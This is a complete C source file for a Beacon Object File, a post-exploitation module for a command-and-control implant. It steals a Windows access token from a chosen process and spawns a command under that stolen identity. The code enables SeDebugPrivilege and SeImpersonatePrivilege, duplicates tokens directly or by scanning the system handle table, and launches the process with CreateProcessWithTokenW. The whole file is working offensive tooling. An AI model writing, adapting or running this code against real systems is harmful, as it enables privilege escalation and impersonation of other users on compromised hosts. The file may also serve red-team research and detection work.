/*
 * impersonate_bof.c
 *
 * BOF version of impersonate.c -- steals a token from a target PID and
 * launches a specified command as the stolen identity.
 *
 * Token acquisition strategy:
 *   1. OpenProcessToken with TOKEN_DUPLICATE (direct)
 *   2. Fallback: OpenProcess(PROCESS_DUP_HANDLE) + system handle table
 *      scan via NtQuerySystemInformation
 *
 * Arguments (packed via bof_pack):
 *   int     target_pid  - PID to steal token from
 *   z-string command    - command line to spawn (e.g. "cmd.exe", "whoami.exe")
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c -o impersonate_bof.x64.o impersonate_bof.c
 */

#include <windows.h>
#include "beacon.h"

/* ── ntdll types ───────────────────────────────────────────────────── */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004)
#define SystemHandleInformation 16

typedef struct {
    ULONG       ProcessId;
    UCHAR       ObjectTypeNumber;
    UCHAR       Flags;
    USHORT      Handle;
    PVOID       Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY;

typedef struct {
    ULONG                NumberOfHandles;
    SYSTEM_HANDLE_ENTRY  Handles[1];
} SYSTEM_HANDLE_INFORMATION;

/* ── DFR declarations ──────────────────────────────────────────────── */

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$DuplicateHandle(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HLOCAL  WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);

DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$EqualSid(PSID, PSID);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetLengthSid(PSID);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CopySid(DWORD, PSID, PSID);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

DECLSPEC_IMPORT void  *MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void  *MSVCRT$realloc(void*, size_t);
DECLSPEC_IMPORT void   MSVCRT$free(void*);
DECLSPEC_IMPORT void  *MSVCRT$memset(void*, int, size_t);

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);

/* ── helpers ───────────────────────────────────────────────────────── */

static void enable_priv(const char *priv_name) {
    HANDLE tok;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return;
    if (ADVAPI32$LookupPrivilegeValueA(NULL, priv_name, &luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ADVAPI32$AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    }
    KERNEL32$CloseHandle(tok);
}

static PSID get_token_user_sid(HANDLE tok) {
    DWORD len = 0;
    ADVAPI32$GetTokenInformation(tok, TokenUser, NULL, 0, &len);
    if (!len) return NULL;
    TOKEN_USER *tu = MSVCRT$malloc(len);
    if (!tu) return NULL;
    PSID copy = NULL;
    if (ADVAPI32$GetTokenInformation(tok, TokenUser, tu, len, &len)) {
        DWORD slen = ADVAPI32$GetLengthSid(tu->User.Sid);
        copy = MSVCRT$malloc(slen);
        if (copy) ADVAPI32$CopySid(slen, copy, tu->User.Sid);
    }
    MSVCRT$free(tu);
    return copy;
}

/* ── Token acquisition strategies ──────────────────────────────────── */

/* Strategy 1: direct OpenProcessToken */
static HANDLE try_direct(DWORD pid, PSID our_sid) {
    HANDLE proc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!proc) return NULL;

    HANDLE tok = NULL;
    if (!ADVAPI32$OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &tok)) {
        KERNEL32$CloseHandle(proc);
        return NULL;
    }

    /* Skip if same user */
    if (our_sid) {
        PSID tok_sid = get_token_user_sid(tok);
        if (tok_sid && ADVAPI32$EqualSid(tok_sid, our_sid)) {
            MSVCRT$free(tok_sid);
            KERNEL32$CloseHandle(tok);
            KERNEL32$CloseHandle(proc);
            return NULL;
        }
        MSVCRT$free(tok_sid);
    }

    HANDLE primary = NULL;
    ADVAPI32$DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL,
                              SecurityImpersonation, TokenPrimary, &primary);
    KERNEL32$CloseHandle(tok);
    KERNEL32$CloseHandle(proc);
    return primary;
}

/* Strategy 2: handle table scan */
static HANDLE try_handle_scan(DWORD pid, PSID our_sid,
                              NtQuerySystemInformation_t pNtQSI) {
    if (!pNtQSI) return NULL;

    HANDLE proc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
    if (!proc) return NULL;

    ULONG bufsize = 1024 * 1024;
    SYSTEM_HANDLE_INFORMATION *shi = NULL;
    NTSTATUS status;
    do {
        shi = MSVCRT$realloc(shi, bufsize);
        if (!shi) { KERNEL32$CloseHandle(proc); return NULL; }
        status = pNtQSI(SystemHandleInformation, shi, bufsize, NULL);
        if (status == STATUS_INFO_LENGTH_MISMATCH) bufsize *= 2;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        MSVCRT$free(shi);
        KERNEL32$CloseHandle(proc);
        return NULL;
    }

    HANDLE result = NULL;
    for (ULONG i = 0; i < shi->NumberOfHandles; i++) {
        SYSTEM_HANDLE_ENTRY *e = &shi->Handles[i];
        if (e->ProcessId != pid) continue;

        HANDLE dup = NULL;
        if (!KERNEL32$DuplicateHandle(proc, (HANDLE)(ULONG_PTR)e->Handle,
                KERNEL32$GetCurrentProcess(), &dup,
                TOKEN_QUERY | TOKEN_DUPLICATE, FALSE, 0))
            continue;

        TOKEN_TYPE tt;
        DWORD len;
        if (!ADVAPI32$GetTokenInformation(dup, TokenType, &tt, sizeof(tt), &len)) {
            KERNEL32$CloseHandle(dup);
            continue;
        }

        /* Skip same user */
        if (our_sid) {
            PSID tok_sid = get_token_user_sid(dup);
            if (tok_sid && ADVAPI32$EqualSid(tok_sid, our_sid)) {
                MSVCRT$free(tok_sid);
                KERNEL32$CloseHandle(dup);
                continue;
            }
            MSVCRT$free(tok_sid);
        }

        HANDLE primary = NULL;
        if (ADVAPI32$DuplicateTokenEx(dup, MAXIMUM_ALLOWED, NULL,
                SecurityImpersonation, TokenPrimary, &primary)) {
            KERNEL32$CloseHandle(dup);
            result = primary;
            break;
        }
        KERNEL32$CloseHandle(dup);
    }

    MSVCRT$free(shi);
    KERNEL32$CloseHandle(proc);
    return result;
}

/* ── BOF entry point ───────────────────────────────────────────────── */

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int target_pid = BeaconDataInt(&parser);
    int cmd_len    = 0;
    char *cmd      = BeaconDataExtract(&parser, &cmd_len);

    if (target_pid <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: impersonate_bof <PID> <command>");
        return;
    }
    if (!cmd || !cmd[0]) {
        BeaconPrintf(CALLBACK_ERROR, "No command specified");
        return;
    }

    enable_priv("SeDebugPrivilege");
    enable_priv("SeImpersonatePrivilege");

    /* Get our own SID to skip matching tokens */
    PSID our_sid = NULL;
    {
        HANDLE our_tok;
        if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &our_tok)) {
            our_sid = get_token_user_sid(our_tok);
            KERNEL32$CloseHandle(our_tok);
        }
    }

    /* Strategy 1: direct OpenProcessToken */
    HANDLE primary = try_direct((DWORD)target_pid, our_sid);
    const char *method = "direct";

    /* Strategy 2: handle table scan fallback */
    if (!primary) {
        HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
        NtQuerySystemInformation_t pNtQSI = NULL;
        if (ntdll)
            pNtQSI = (NtQuerySystemInformation_t)
                KERNEL32$GetProcAddress(ntdll, "NtQuerySystemInformation");
        primary = try_handle_scan((DWORD)target_pid, our_sid, pNtQSI);
        method = "handle scan";
    }

    MSVCRT$free(our_sid);

    if (!primary) {
        BeaconPrintf(CALLBACK_ERROR, "No usable token found in PID %d", target_pid);
        return;
    }

    /* Report stolen identity */
    {
        PSID sid = get_token_user_sid(primary);
        if (sid) {
            char name[256] = {0}, domain[256] = {0};
            DWORD nlen = sizeof(name), dlen = sizeof(domain);
            SID_NAME_USE use;
            ADVAPI32$LookupAccountSidA(NULL, sid, name, &nlen, domain, &dlen, &use);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Stolen token: %s\\%s [%s]",
                         domain, name, method);
            MSVCRT$free(sid);
        }
    }

    /* Convert command to wide string and spawn */
    int wlen = KERNEL32$MultiByteToWideChar(CP_ACP, 0, cmd, -1, NULL, 0);
    WCHAR *wcmd = MSVCRT$malloc(wlen * sizeof(WCHAR));
    if (!wcmd) {
        BeaconPrintf(CALLBACK_ERROR, "Allocation failed");
        KERNEL32$CloseHandle(primary);
        return;
    }
    KERNEL32$MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, wlen);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    MSVCRT$memset(&si, 0, sizeof(si));
    MSVCRT$memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    if (!ADVAPI32$CreateProcessWithTokenW(primary, 0, NULL, wcmd,
            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithTokenW FAILED: %lu",
                     KERNEL32$GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Launched '%s' as PID %lu", cmd, pi.dwProcessId);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$CloseHandle(pi.hThread);
    }

    MSVCRT$free(wcmd);
    KERNEL32$CloseHandle(primary);
}
